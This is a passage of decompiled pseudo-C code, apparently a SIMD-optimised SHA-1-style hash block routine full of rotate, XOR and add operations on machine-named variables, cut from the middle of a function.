      HIDWORD(v1486) = v1431;
      v1487 = v1486 >> 7;
      v1488 = v1485 + (v1433 ^ v1432) + v1545 + v1427;
      HIDWORD(v1486) = v1488;
      LODWORD(v1486) = v1488;
      v1489 = v1486 >> 27;
      LODWORD(v1486) = v1485;
      HIDWORD(v1486) = v1485;
      v1490 = v1486 >> 7;
      v1491 = v1489 + (v1487 ^ v1433 ^ v1484) + DWORD1(v1545) + v1430;
      HIDWORD(v1486) = v1491;
      LODWORD(v1486) = v1491;
      v1492 = v1486 >> 27;
      LODWORD(v1486) = v1489;
      HIDWORD(v1486) = v1489;
      v1493 = v1486 >> 7;
      v1494 = v1492 + (v1490 ^ v1487 ^ v1488) + DWORD2(v1545) + v1433;
      HIDWORD(v1486) = v1494;
      LODWORD(v1486) = v1494;
      v1495 = v1486 >> 27;
      LODWORD(v1486) = v1492;
      HIDWORD(v1486) = v1492;
      v1496 = v1486 >> 7;
      v1497 = v1495 + (v1493 ^ v1490 ^ v1491) + HIDWORD(v1545) + v1487;
      HIDWORD(v1486) = v1497;
      LODWORD(v1486) = v1497;
      v1498 = v1486 >> 27;
      LODWORD(v1486) = v1495;
      HIDWORD(v1486) = v1495;
      v1499 = v1486 >> 7;
      v1500 = v1498 + (v1496 ^ v1493 ^ v1494) + v1555 + v1490;
      HIDWORD(v1486) = v1500;
      LODWORD(v1486) = v1500;
      v1501 = v1486 >> 27;
      LODWORD(v1486) = v1498;
      HIDWORD(v1486) = v1498;
      v1502 = v1486 >> 7;
      v1503 = v1501 + (v1499 ^ v1496 ^ v1497) + DWORD1(v1555) + v1493;
      HIDWORD(v1486) = v1503;
      LODWORD(v1486) = v1503;
      v1504 = v1486 >> 27;
      LODWORD(v1486) = v1501;
      HIDWORD(v1486) = v1501;
      v1505 = v1486 >> 7;
      v1506 = v1504 + (v1502 ^ v1499 ^ v1500) + DWORD2(v1555) + v1496;
      HIDWORD(v1486) = v1506;
      LODWORD(v1486) = v1506;
      v1507 = v1486 >> 27;
      LODWORD(v1486) = v1504;
      HIDWORD(v1486) = v1504;
      v1508 = v1486 >> 7;
      v1509 = v1507 + (v1505 ^ v1502 ^ v1503) + HIDWORD(v1555) + v1499;
      HIDWORD(v1486) = v1509;
      LODWORD(v1486) = v1509;
      v1510 = v1486 >> 27;
      LODWORD(v1486) = v1507;
      HIDWORD(v1486) = v1507;
      v1511 = v1486 >> 7;
      v1512 = v1510 + (v1508 ^ v1505 ^ v1506) + v1565 + v1502;
      HIDWORD(v1486) = v1512;
      LODWORD(v1486) = v1512;
      v1513 = v1486 >> 27;
      LODWORD(v1486) = v1510;
      HIDWORD(v1486) = v1510;
      v1514 = v1486 >> 7;
      v1515 = v1513 + (v1511 ^ v1508 ^ v1509) + DWORD1(v1565) + v1505;
      HIDWORD(v1486) = v1515;
      LODWORD(v1486) = v1515;
      v1516 = v1486 >> 27;
      LODWORD(v1486) = v1513;
      HIDWORD(v1486) = v1513;
      v1517 = v1486 >> 7;
      v1518 = v1516 + (v1514 ^ v1511 ^ v1512) + DWORD2(v1565) + v1508;
      HIDWORD(v1486) = v1518;
      LODWORD(v1486) = v1518;
      v1519 = v1486 >> 27;
      LODWORD(v1486) = v1516;
      HIDWORD(v1486) = v1516;
      v1520 = v1519 + (v1517 ^ v1514 ^ v1515) + HIDWORD(v1565) + v1511;
      __asm { vzeroall }
      v1521 = (_DWORD *)v1574.m128i_i32[0];
      result = *(_DWORD *)v1574.m128i_i32[0] + v1520;
      v1522 = *(_DWORD *)(v1574.m128i_i32[0] + 4) + v1518;
      v1523 = *(_DWORD *)(v1574.m128i_i32[0] + 8) + (v1486 >> 7);
      *(_DWORD *)v1574.m128i_i32[0] = result;
      v1524 = v1521[3] + v1517;
      v1521[1] = v1522;
      v1525 = v1521[4] + v1514;
      v1521[2] = v1523;
      v1521[3] = v1524;
      v1521[4] = v1525;
    }
    else
    {
      v378 = _mm_load_si128((const __m128i *)dword_46C480);
      v1569 = _mm_load_si128((const __m128i *)(v1574.m128i_i32[3] + 12167));
      v1570 = _mm_load_si128((const __m128i *)(v1574.m128i_i32[3] + 12183));
      v1571 = _mm_load_si128((const __m128i *)(v1574.m128i_i32[3] + 12199));
      v1572 = v378;
      v1573 = _mm_load_si128((const __m128i *)(v1574.m128i_i32[3] + 12215));
      v1574.m128i_i32[0] = (__int32)a1;
      v1574.m128i_i32[1] = (__int32)a2[4].m128i_i32;
      v1574.m128i_i32[2] = (__int32)a2[4 * a3].m128i_i32;
      v1574.m128i_i32[3] = (__int32)v1575;
      v379 = a1->m128i_i32[0];
      v380 = a1->m128i_i32[1];
      v381 = a1->m128i_i32[2];
      v382 = a1->m128i_i32[3];
      v383 = a1[1].m128i_i32[0];
      v1568 = v378;
      v384 = _mm_shuffle_epi8(_mm_loadu_si128(a2 + 3), v1573);
      v1526 = _mm_add_epi32(_mm_shuffle_epi8(_mm_loadu_si128(a2), v1573), v378);
      v385 = _mm_sub_epi32(v1526, v378);
      v1536 = _mm_add_epi32(_mm_shuffle_epi8(_mm_loadu_si128(a2 + 1), v1573), v378);
      v386 = _mm_sub_epi32(v1536, v378);
      v1546 = _mm_add_epi32(_mm_shuffle_epi8(_mm_loadu_si128(a2 + 2), v1573), v378);
      v387 = _mm_sub_epi32(v1546, v378);
      v388 = _mm_shuffle_epi32(v385, 238);
      v389 = (v382 ^ v381) & v380;
      while ( 1 )
      {
        v390 = v379;
        v391 = v381 ^ __ROR4__(v380, 2);
        v1566 = v385;
        v392 = __ROL4__(v379, 5);
        v393 = v391 & v390;
        v394 = v381 ^ v391;
        v395 = v392 + (v382 ^ v389) + v1526.m128i_i32[0] + v383;
        v396 = v394 ^ __ROR4__(v392, 7);
        v397 = __ROL4__(v395, 5);
        v1556 = _mm_add_epi32(v378, v384);
        v398 = v396 & v395;
        v399 = v394 ^ v396;
        v400 = _mm_xor_si128(
                 _mm_xor_si128(_mm_unpacklo_epi64(v388, v386), v385),
                 _mm_xor_si128(_mm_srli_si128(v384, 4), v387));
        v401 = v397 + (v381 ^ v393) + v1526.m128i_i32[1] + v382;
        v402 = v399 ^ __ROR4__(v397, 7);
        v403 = __ROL4__(v401, 5);
        v404 = _mm_slli_si128(v400, 12);
        v405 = v402 & v401;
        v406 = v399 ^ v402;
        v407 = v403 + (v394 ^ v398) + v1526.m128i_i32[2] + v381;
        v408 = v406 ^ __ROR4__(v403, 7);
        v409 = __ROL4__(v407, 5);
        v410 = v408 & v407;
        v411 = _mm_xor_si128(
                 _mm_xor_si128(
                   _mm_or_si128(_mm_add_epi32(v400, v400), _mm_srli_epi32(v400, 0x1Fu)),
                   _mm_srli_epi32(v404, 0x1Eu)),
                 _mm_slli_epi32(v404, 2u));
        v412 = v406 ^ v408;
        v413 = v409 + (v399 ^ v405) + v1526.m128i_i32[3] + v394;
        v414 = v412 ^ __ROR4__(v409, 7);
        v415 = _mm_add_epi32(_mm_load_si128(&v1568), v411);
        v1567 = v386;
        v416 = __ROL4__(v413, 5);
        v417 = v414 & v413;
        v418 = v412 ^ v414;
        v419 = v416 + (v406 ^ v410) + v1536.m128i_i32[0] + v399;
        v420 = v418 ^ __ROR4__(v416, 7);
        v421 = __ROL4__(v419, 5);
        v1527 = v415;
        v422 = v420 & v419;
        v423 = v418 ^ v420;
        v424 = _mm_xor_si128(
                 _mm_xor_si128(_mm_unpacklo_epi64(_mm_shuffle_epi32(v386, 238), v387), v386),
                 _mm_xor_si128(_mm_srli_si128(v411, 4), v384));
        v425 = v421 + (v412 ^ v417) + v1536.m128i_i32[1] + v406;
        v426 = v423 ^ __ROR4__(v421, 7);
        v427 = __ROL4__(v425, 5);
        v428 = _mm_slli_si128(v424, 12);
        v429 = v426 & v425;
        v430 = v423 ^ v426;
        v431 = v427 + (v418 ^ v422) + v1536.m128i_i32[2] + v412;
        v432 = v430 ^ __ROR4__(v427, 7);
        v433 = __ROL4__(v431, 5);
        v434 = v432 & v431;
        v435 = _mm_xor_si128(
                 _mm_xor_si128(
                   _mm_or_si128(_mm_add_epi32(v424, v424), _mm_srli_epi32(v424, 0x1Fu)),
                   _mm_srli_epi32(v428, 0x1Eu)),
                 _mm_slli_epi32(v428, 2u));
        v436 = v430 ^ v432;
        v437 = v433 + (v423 ^ v429) + v1536.m128i_i32[3] + v418;
        v438 = v436 ^ __ROR4__(v433, 7);
        v439 = _mm_add_epi32(_mm_load_si128(&v1569), v435);
        v1568 = v387;
        v440 = __ROL4__(v437, 5);
        v441 = v438 & v437;
        v442 = v436 ^ v438;
        v443 = v440 + (v430 ^ v434) + v1546.m128i_i32[0] + v423;
        v444 = v442 ^ __ROR4__(v440, 7);
        v445 = __ROL4__(v443, 5);
        v1537 = v439;
        v446 = v444 & v443;
        v447 = v442 ^ v444;
        v448 = _mm_xor_si128(
                 _mm_xor_si128(_mm_unpacklo_epi64(_mm_shuffle_epi32(v387, 238), v384), v387),
                 _mm_xor_si128(_mm_srli_si128(v435, 4), v411));
        v449 = v445 + (v436 ^ v441) + v1546.m128i_i32[1] + v430;
        v450 = v447 ^ __ROR4__(v445, 7);
        v451 = __ROL4__(v449, 5);
        v452 = _mm_slli_si128(v448, 12);
        v453 = v450 & v449;
        v454 = v447 ^ v450;
        v455 = _mm_or_si128(_mm_add_epi32(v448, v448), _mm_srli_epi32(v448, 0x1Fu));
        v456 = _mm_load_si128(&v1566);
        v457 = v451 + (v442 ^ v446) + v1546.m128i_i32[2] + v436;
        v458 = v454 ^ __ROR4__(v451, 7);
        v459 = __ROL4__(v457, 5);
        v460 = v458 & v457;
        v461 = _mm_xor_si128(_mm_xor_si128(v455, _mm_srli_epi32(v452, 0x1Eu)), _mm_slli_epi32(v452, 2u));
        v462 = v454 ^ v458;
        v463 = v459 + (v447 ^ v453) + v1546.m128i_i32[3] + v442;
        v464 = v462 ^ __ROR4__(v459, 7);
        v465 = _mm_add_epi32(_mm_load_si128(&v1569), v461);
        v1566 = v384;
        v466 = __ROL4__(v463, 5);
        v467 = v464 & v463;
        v468 = v462 ^ v464;
        v469 = v466 + (v454 ^ v460) + v1556.m128i_i32[0] + v447;
        v470 = v468 ^ __ROR4__(v466, 7);
        v471 = __ROL4__(v469, 5);
        v1547 = v465;
        v472 = v470 & v469;
        v473 = v468 ^ v470;
        v474 = _mm_xor_si128(
                 _mm_xor_si128(_mm_unpacklo_epi64(_mm_shuffle_epi32(v384, 238), v411), v384),
                 _mm_xor_si128(_mm_srli_si128(v461, 4), v435));
        v475 = v471 + (v462 ^ v467) + v1556.m128i_i32[1] + v454;
        v476 = v473 ^ __ROR4__(v471, 7);
        v477 = __ROL4__(v475, 5);
        v478 = _mm_slli_si128(v474, 12);
        v479 = v476 & v475;
        v480 = v473 ^ v476;
        v481 = _mm_or_si128(_mm_add_epi32(v474, v474), _mm_srli_epi32(v474, 0x1Fu));
        v482 = _mm_load_si128(&v1567);
        v483 = v477 + (v468 ^ v472) + v1556.m128i_i32[2] + v462;
        v484 = v480 ^ __ROR4__(v477, 7);
        v485 = __ROL4__(v483, 5);
        v486 = _mm_load_si128(&v1569);
        v487 = v484 & v483;
        v488 = _mm_xor_si128(_mm_xor_si128(v481, _mm_srli_epi32(v478, 0x1Eu)), _mm_slli_epi32(v478, 2u));
        v489 = v480 ^ v484;
        v490 = v485 + (v473 ^ v479) + v1556.m128i_i32[3] + v468;
        v1567 = v411;
        v491 = v489 ^ __ROR4__(v485, 7);
        v492 = __ROL4__(v490, 5);
        v493 = v491 & v490;
        v494 = v489 ^ v491;
        v495 = _mm_xor_si128(
                 _mm_xor_si128(_mm_xor_si128(v456, v411), v482),
                 _mm_unpacklo_epi64(_mm_shuffle_epi32(v461, 238), v488));
        v1557 = _mm_add_epi32(v486, v488);
        v496 = v492 + (v480 ^ v487) + v1527.m128i_i32[0] + v473;
        v497 = v494 ^ __ROR4__(v492, 7);
        v498 = __ROL4__(v496, 5);
        v499 = v497 & v496;
        v500 = v494 ^ v497;
        v501 = v498 + (v489 ^ v493) + v1527.m128i_i32[1] + v480;
        v502 = v500 ^ __ROR4__(v498, 7);
        v503 = __ROL4__(v501, 5);
        v504 = _mm_or_si128(_mm_slli_epi32(v495, 2u), _mm_srli_epi32(v495, 0x1Eu));
        v505 = v502 & v501;
        v506 = _mm_load_si128(&v1568);
        v507 = v500 ^ v502;
        v508 = v503 + (v494 ^ v499) + v1527.m128i_i32[2] + v489;
        v509 = __ROL4__(v508, 5);
        v510 = __ROR4__(v503, 7);
        v511 = v509 + (v500 ^ v505) + v1527.m128i_i32[3] + v494;
        v512 = __ROL4__(v511, 5);
        v513 = _mm_xor_si128(_mm_xor_si128(v482, v435), v506);
        v1568 = v435;
        v514 = v486;
        v515 = __ROR4__(v509, 7);
        v516 = v512 + (v510 ^ v507 ^ v508) + v1537.m128i_i32[0] + v500;
        v517 = __ROL4__(v516, 5);
        v518 = _mm_xor_si128(v513, _mm_unpacklo_epi64(_mm_shuffle_epi32(v488, 238), v504));
        v1528 = _mm_add_epi32(v514, v504);
        v519 = __ROR4__(v512, 7);
        v520 = v517 + (v515 ^ v510 ^ v511) + v1537.m128i_i32[1] + v507;
        v521 = __ROL4__(v520, 5);
        v522 = __ROR4__(v517, 7);
        v523 = _mm_or_si128(_mm_slli_epi32(v518, 2u), _mm_srli_epi32(v518, 0x1Eu));
        v524 = _mm_load_si128(&v1566);
        v525 = v521 + (v519 ^ v515 ^ v516) + v1537.m128i_i32[2] + v510;
        v526 = __ROL4__(v525, 5);
        v527 = __ROR4__(v521, 7);
        v528 = v526 + (v522 ^ v519 ^ v520) + v1537.m128i_i32[3] + v515;
        v529 = __ROL4__(v528, 5);
        v530 = _mm_xor_si128(_mm_xor_si128(v506, v461), v524);
        v1566 = v461;
        v531 = _mm_load_si128(&v1570);
        v532 = __ROR4__(v526, 7);
        v533 = v529 + (v527 ^ v522 ^ v525) + v1547.m128i_i32[0] + v519;
        v534 = __ROL4__(v533, 5);
        v535 = _mm_xor_si128(v530, _mm_unpacklo_epi64(_mm_shuffle_epi32(v504, 238), v523));
        v1538 = _mm_add_epi32(v514, v523);
        v536 = __ROR4__(v529, 7);
        v537 = v534 + (v532 ^ v527 ^ v528) + v1547.m128i_i32[1] + v522;
        v538 = __ROL4__(v537, 5);
        v539 = __ROR4__(v534, 7);
        v540 = _mm_or_si128(_mm_slli_epi32(v535, 2u), _mm_srli_epi32(v535, 0x1Eu));
        v541 = _mm_load_si128(&v1567);
        v542 = v538 + (v536 ^ v532 ^ v533) + v1547.m128i_i32[2] + v527;
        v543 = __ROL4__(v542, 5);
        v544 = __ROR4__(v538, 7);
        v545 = v543 + (v539 ^ v536 ^ v537) + v1547.m128i_i32[3] + v532;
        v546 = __ROL4__(v545, 5);
        v1567 = v488;
        v547 = __ROR4__(v543, 7);
        v548 = v546 + (v544 ^ v539 ^ v542) + v1557.m128i_i32[0] + v536;
        v549 = __ROL4__(v548, 5);
        v550 = _mm_xor_si128(
                 _mm_xor_si128(_mm_xor_si128(v524, v488), v541),
                 _mm_unpacklo_epi64(_mm_shuffle_epi32(v523, 238), v540));
        v1548 = _mm_add_epi32(v531, v540);
        v551 = __ROR4__(v546, 7);
        v552 = v549 + (v547 ^ v544 ^ v545) + v1557.m128i_i32[1] + v539;
        v553 = __ROL4__(v552, 5);
        v554 = __ROR4__(v549, 7);
        v555 = _mm_or_si128(_mm_slli_epi32(v550, 2u), _mm_srli_epi32(v550, 0x1Eu));
        v556 = _mm_load_si128(&v1568);
        v557 = v553 + (v551 ^ v547 ^ v548) + v1557.m128i_i32[2] + v544;
        v558 = __ROL4__(v557, 5);
        v559 = __ROR4__(v553, 7);
        v560 = v558 + (v554 ^ v551 ^ v552) + v1557.m128i_i32[3] + v547;
        v561 = __ROL4__(v560, 5);
        v562 = _mm_xor_si128(_mm_xor_si128(v541, v504), v556);
        v1568 = v504;
        v563 = v531;
        v564 = __ROR4__(v558, 7);
        v565 = v561 + (v559 ^ v554 ^ v557) + v1528.m128i_i32[0] + v551;
        v566 = __ROL4__(v565, 5);
        v567 = _mm_xor_si128(v562, _mm_unpacklo_epi64(_mm_shuffle_epi32(v540, 238), v555));
        v1558 = _mm_add_epi32(v563, v555);
        v568 = __ROR4__(v561, 7);
        v569 = v566 + (v564 ^ v559 ^ v560) + v1528.m128i_i32[1] + v554;
        v570 = __ROL4__(v569, 5);
        v571 = __ROR4__(v566, 7);
        v572 = _mm_or_si128(_mm_slli_epi32(v567, 2u), _mm_srli_epi32(v567, 0x1Eu));
        v573 = _mm_load_si128(&v1566);
        v574 = v570 + (v568 ^ v564 ^ v565) + v1528.m128i_i32[2] + v559;
        v575 = __ROL4__(v574, 5);
        v576 = __ROR4__(v570, 7);
        v577 = v575 + (v571 ^ v568 ^ v569) + v1528.m128i_i32[3] + v564;
        v578 = __ROL4__(v577, 5);
        v1566 = v523;
        v579 = __ROR4__(v575, 7);
        v580 = v578 + (v576 ^ v571 ^ v574) + v1538.m128i_i32[0] + v568;
        v581 = __ROL4__(v580, 5);
        v582 = _mm_xor_si128(
                 _mm_xor_si128(_mm_xor_si128(v556, v523), v573),
                 _mm_unpacklo_epi64(_mm_shuffle_epi32(v555, 238), v572));
        v1529 = _mm_add_epi32(v563, v572);
        v583 = __ROR4__(v578, 7);
        v584 = v581 + (v579 ^ v576 ^ v577) + v1538.m128i_i32[1] + v571;
        v585 = __ROL4__(v584, 5);
        v586 = __ROR4__(v581, 7);
        v587 = v585 + (v583 ^ v579 ^ v580) + v1538.m128i_i32[2] + v576;
        v588 = _mm_or_si128(_mm_slli_epi32(v582, 2u), _mm_srli_epi32(v582, 0x1Eu));
        v589 = _mm_load_si128(&v1567);
        v590 = __ROR4__(v585, 7);
        v591 = v587;
        v592 = __ROL4__(v587, 5);
        v593 = v590 ^ v591;
        v594 = v586 ^ v590;
        v595 = v592 + (v586 ^ v583 ^ v584) + v1538.m128i_i32[3] + v579;
        v596 = v594 & v593;
        v597 = v586 ^ v594;
        v598 = __ROR4__(v592, 7);
        v599 = _mm_xor_si128(_mm_xor_si128(v573, v540), v589);
        v1567 = v540;
        v600 = v595;
        v601 = __ROL4__(v595, 5);
        v602 = v563;
        v603 = v598 ^ v600;
        v604 = v597 ^ v598;
        v605 = v601 + (v597 ^ v596) + v1548.m128i_i32[0] + v583;
        v606 = v604 & v603;
        v607 = _mm_xor_si128(v599, _mm_unpacklo_epi64(_mm_shuffle_epi32(v572, 238), v588));
        v1539 = _mm_add_epi32(v602, v588);
        v608 = v597 ^ v604;
        v609 = __ROR4__(v601, 7);
        v610 = v605;
        v611 = __ROL4__(v605, 5);
        v612 = v609 ^ v610;
        v613 = v608 ^ v609;
        v614 = v611 + (v608 ^ v606) + v1548.m128i_i32[1] + v586;
        v615 = v613 & v612;
        v616 = v608 ^ v613;
        v617 = __ROR4__(v611, 7);
        v618 = _mm_or_si128(_mm_slli_epi32(v607, 2u), _mm_srli_epi32(v607, 0x1Eu));
        v619 = v614;
        v620 = _mm_load_si128(&v1568);
        v621 = __ROL4__(v614, 5);
        v622 = v617 ^ v619;
        v623 = v616 ^ v617;
        v624 = v621 + (v616 ^ v615) + v1548.m128i_i32[2] + v597;
        v625 = v623 & v622;
        v626 = v616 ^ v623;
        v627 = __ROR4__(v621, 7);
        v628 = v624;
        v629 = __ROL4__(v624, 5);
        v630 = v627 ^ v628;
        v631 = v626 ^ v627;
        v632 = v629 + (v626 ^ v625) + v1548.m128i_i32[3] + v608;
        v633 = v631 & v630;
        v634 = v626 ^ v631;
        v635 = __ROR4__(v629, 7);
        v636 = _mm_xor_si128(_mm_xor_si128(v589, v555), v620);
        v1568 = v555;
        v637 = v632;
        v638 = __ROL4__(v632, 5);
        v639 = _mm_load_si128(&v1571);
        v640 = v635 ^ v637;
        v641 = v634 ^ v635;
        v642 = v638 + (v634 ^ v633) + v1558.m128i_i32[0] + v616;
        v643 = v641 & v640;
        v644 = _mm_xor_si128(v636, _mm_unpacklo_epi64(_mm_shuffle_epi32(v588, 238), v618));
        v1549 = _mm_add_epi32(v602, v618);
        v645 = v634 ^ v641;
        v646 = __ROR4__(v638, 7);
        v647 = v642;
        v648 = __ROL4__(v642, 5);
        v649 = v646 ^ v647;
        v650 = v645 ^ v646;
        v651 = v648 + (v645 ^ v643) + v1558.m128i_i32[1] + v626;
        v652 = v650 & v649;
        v653 = v645 ^ v650;
        v654 = __ROR4__(v648, 7);
        v655 = _mm_or_si128(_mm_slli_epi32(v644, 2u), _mm_srli_epi32(v644, 0x1Eu));
        v656 = v651;
        v657 = _mm_load_si128(&v1566);
        v658 = __ROL4__(v651, 5);
        v659 = v654 ^ v656;
        v660 = v653 ^ v654;
        v661 = v658 + (v653 ^ v652) + v1558.m128i_i32[2] + v634;
        v662 = v660 & v659;
        v663 = v653 ^ v660;
        v664 = __ROR4__(v658, 7);
        v665 = v661;
        v666 = __ROL4__(v661, 5);
        v667 = v664 ^ v665;
        v668 = v663 ^ v664;
        v669 = v666 + (v663 ^ v662) + v1558.m128i_i32[3] + v645;
        v670 = v668 & v667;
        v671 = v663 ^ v668;
        v672 = __ROR4__(v666, 7);
        v1566 = v572;
        v673 = v669;
        v674 = __ROL4__(v669, 5);
        v675 = v672 ^ v673;
        v676 = v671 ^ v672;
        v677 = v674 + (v671 ^ v670) + v1529.m128i_i32[0] + v653;
        v678 = v676 & v675;
        v679 = _mm_xor_si128(
                 _mm_xor_si128(_mm_xor_si128(v620, v572), v657),
                 _mm_unpacklo_epi64(_mm_shuffle_epi32(v618, 238), v655));
        v1559 = _mm_add_epi32(v639, v655);
        v680 = v671 ^ v676;
        v681 = __ROR4__(v674, 7);
        v682 = v677;
        v683 = __ROL4__(v677, 5);
        v684 = v681 ^ v682;
        v685 = v680 ^ v681;
        v686 = v683 + (v680 ^ v678) + v1529.m128i_i32[1] + v663;
        v687 = v685 & v684;
        v688 = v680 ^ v685;
        v689 = __ROR4__(v683, 7);
        v690 = _mm_or_si128(_mm_slli_epi32(v679, 2u), _mm_srli_epi32(v679, 0x1Eu));
        v691 = v686;
        v692 = _mm_load_si128(&v1567);
        v693 = __ROL4__(v686, 5);
        v694 = v689 ^ v691;
        v695 = v688 ^ v689;
        v696 = v693 + (v688 ^ v687) + v1529.m128i_i32[2] + v671;
        v697 = v695 & v694;
        v698 = v688 ^ v695;
        v699 = __ROR4__(v693, 7);
        v700 = v696;
        v701 = __ROL4__(v696, 5);
        v702 = v699 ^ v700;
        v703 = v698 ^ v699;
        v704 = v701 + (v698 ^ v697) + v1529.m128i_i32[3] + v680;
        v705 = v703 & v702;
        v706 = v698 ^ v703;
        v707 = __ROR4__(v701, 7);
        v708 = _mm_xor_si128(_mm_xor_si128(v657, v588), v692);
        v1567 = v588;
        v709 = v704;
        v710 = __ROL4__(v704, 5);
        v711 = v639;
        v712 = v707 ^ v709;
        v713 = v706 ^ v707;
        v714 = v710 + (v706 ^ v705) + v1539.m128i_i32[0] + v688;
        v715 = v713 & v712;
        v716 = _mm_xor_si128(v708, _mm_unpacklo_epi64(_mm_shuffle_epi32(v655, 238), v690));
        v1530 = _mm_add_epi32(v711, v690);
        v717 = v706 ^ v713;
        v718 = __ROR4__(v710, 7);
        v719 = v714;
        v720 = __ROL4__(v714, 5);
        v721 = v718 ^ v719;
        v722 = v717 ^ v718;
        v723 = v720 + (v717 ^ v715) + v1539.m128i_i32[1] + v698;
        v724 = v722 & v721;
        v725 = v717 ^ v722;
        v726 = __ROR4__(v720, 7);
        v727 = _mm_or_si128(_mm_slli_epi32(v716, 2u), _mm_srli_epi32(v716, 0x1Eu));
        v728 = v723;
        v729 = _mm_load_si128(&v1568);
        v730 = __ROL4__(v723, 5);
        v731 = v726 ^ v728;
        v732 = v725 ^ v726;
        v733 = v730 + (v725 ^ v724) + v1539.m128i_i32[2] + v706;
        v734 = v732 & v731;
        v735 = v725 ^ v732;
        v736 = __ROR4__(v730, 7);
        v737 = v733;
        v738 = __ROL4__(v733, 5);
        v739 = v736 ^ v737;
        v740 = v735 ^ v736;
        v741 = v738 + (v735 ^ v734) + v1539.m128i_i32[3] + v717;
        v742 = v740 & v739;
        v743 = v735 ^ v740;
        v744 = __ROR4__(v738, 7);
        v745 = _mm_xor_si128(_mm_xor_si128(v692, v618), v729);
        v1568 = v618;
        v746 = v741;
        v747 = __ROL4__(v741, 5);
        v748 = v711;
        v749 = v744 ^ v746;
        v750 = v743 ^ v744;
        v751 = v747 + (v743 ^ v742) + v1549.m128i_i32[0] + v725;
        v752 = v750 & v749;
        v753 = _mm_xor_si128(v745, _mm_unpacklo_epi64(_mm_shuffle_epi32(v690, 238), v727));
        v1540 = _mm_add_epi32(v711, v727);
        v754 = v743 ^ v750;
        v755 = __ROR4__(v747, 7);
        v756 = v751;
        v757 = __ROL4__(v751, 5);
        v758 = v755 ^ v756;
        v759 = v754 ^ v755;
        v760 = v757 + (v754 ^ v752) + v1549.m128i_i32[1] + v735;
        v761 = v759 & v758;
        v762 = v754 ^ v759;
        v763 = __ROR4__(v757, 7);
        v764 = _mm_or_si128(_mm_slli_epi32(v753, 2u), _mm_srli_epi32(v753, 0x1Eu));
        v765 = v760;
        v766 = __ROL4__(v760, 5);
        v767 = v763 ^ v765;
        v768 = v762 ^ v763;
        v769 = v766 + (v762 ^ v761) + v1549.m128i_i32[2] + v743;
        v770 = v768 & v767;
        v771 = v762 ^ v768;
        v772 = __ROR4__(v766, 7);
        v773 = v769;
        v774 = __ROL4__(v769, 5);
        v775 = v774 + (v771 ^ v770) + v1549.m128i_i32[3] + v754;
        v776 = __ROL4__(v775, 5);
        v777 = _mm_xor_si128(_mm_xor_si128(v729, v655), _mm_load_si128(&v1566));
        v1566 = v655;
        v778 = __ROR4__(v774, 7);
        v779 = v776 + (v772 ^ v771 ^ v773) + v1559.m128i_i32[0] + v762;
        v780 = __ROL4__(v779, 5);
        v781 = _mm_xor_si128(v777, _mm_unpacklo_epi64(_mm_shuffle_epi32(v727, 238), v764));
        v1550 = _mm_add_epi32(v748, v764);
        v782 = __ROR4__(v776, 7);
        v783 = v780 + (v778 ^ v772 ^ v775) + v1559.m128i_i32[1] + v771;
        v784 = __ROL4__(v783, 5);
        v785 = __ROR4__(v780, 7);
        v786 = v784 + (v782 ^ v778 ^ v779) + v1559.m128i_i32[2] + v772;
        v787 = __ROL4__(v786, 5);
        v788 = __ROR4__(v784, 7);
        v789 = v787 + (v785 ^ v782 ^ v783) + v1559.m128i_i32[3] + v778;
        v790 = __ROL4__(v789, 5);
        v791 = __ROR4__(v787, 7);
        v792 = v790 + (v788 ^ v785 ^ v786) + v1530.m128i_i32[0] + v782;
        v1560 = _mm_add_epi32(v748, _mm_or_si128(_mm_slli_epi32(v781, 2u), _mm_srli_epi32(v781, 0x1Eu)));
        v793 = __ROL4__(v792, 5);
        v794 = __ROR4__(v790, 7);
        v795 = v793 + (v791 ^ v788 ^ v789) + v1530.m128i_i32[1] + v785;
        v796 = __ROL4__(v795, 5);
        v797 = __ROR4__(v793, 7);
        v798 = v796 + (v794 ^ v791 ^ v792) + v1530.m128i_i32[2] + v788;
        v799 = __ROL4__(v798, 5);
        v800 = v797 ^ v798;
        v801 = __ROR4__(v796, 7);
        v802 = v799 + (v797 ^ v794 ^ v795) + v1530.m128i_i32[3] + v791;
        if ( v1574.m128i_i32[1] == v1574.m128i_i32[2] )
          break;
        v378 = _mm_load_si128(&v1572);
        v803 = _mm_load_si128(&v1573);
        v804 = _mm_loadu_si128((const __m128i *)(v1574.m128i_i32[1] + 16));
        v805 = _mm_loadu_si128((const __m128i *)(v1574.m128i_i32[1] + 32));
        v806 = _mm_loadu_si128((const __m128i *)(v1574.m128i_i32[1] + 48));
        v807 = _mm_shuffle_epi8(_mm_loadu_si128((const __m128i *)v1574.m128i_i32[1]), v803);
        v1574.m128i_i32[1] += 64;
        v1568 = v378;
        v808 = v802;
        v809 = __ROL4__(v802, 5);
        v810 = __ROR4__(v799, 7);
        v811 = v809 + (v801 ^ v800) + v1540.m128i_i32[0] + v794;
        v812 = __ROL4__(v811, 5);
        v813 = __ROR4__(v809, 7);
        v1526 = _mm_add_epi32(v807, v378);
        v814 = v812 + (v810 ^ v801 ^ v808) + v1540.m128i_i32[1] + v797;
        v385 = _mm_sub_epi32(v1526, v378);
        v815 = __ROL4__(v814, 5);
        v816 = __ROR4__(v812, 7);
        v817 = v815 + (v813 ^ v810 ^ v811) + v1540.m128i_i32[2] + v801;
        v818 = __ROL4__(v817, 5);
        v819 = __ROR4__(v815, 7);
        v820 = v818 + (v816 ^ v813 ^ v814) + v1540.m128i_i32[3] + v810;
        v821 = __ROL4__(v820, 5);
        v822 = __ROR4__(v818, 7);
        v823 = v821 + (v819 ^ v816 ^ v817) + v1550.m128i_i32[0] + v813;
        v824 = __ROL4__(v823, 5);
        v825 = __ROR4__(v821, 7);
        v1536 = _mm_add_epi32(_mm_shuffle_epi8(v804, v803), v378);
        v826 = v824 + (v822 ^ v819 ^ v820) + v1550.m128i_i32[1] + v816;
        v386 = _mm_sub_epi32(v1536, v378);
        v827 = __ROL4__(v826, 5);
        v828 = __ROR4__(v824, 7);
        v829 = v827 + (v825 ^ v822 ^ v823) + v1550.m128i_i32[2] + v819;
        v830 = __ROL4__(v829, 5);
        v831 = __ROR4__(v827, 7);
        v832 = v830 + (v828 ^ v825 ^ v826) + v1550.m128i_i32[3] + v822;
        v833 = __ROL4__(v832, 5);
        v834 = __ROR4__(v830, 7);
        v384 = _mm_shuffle_epi8(v806, v803);
        v835 = v833 + (v831 ^ v828 ^ v829) + v1560.m128i_i32[0] + v825;
        v836 = __ROL4__(v835, 5);
        v837 = __ROR4__(v833, 7);
        v1546 = _mm_add_epi32(_mm_shuffle_epi8(v805, v803), v378);
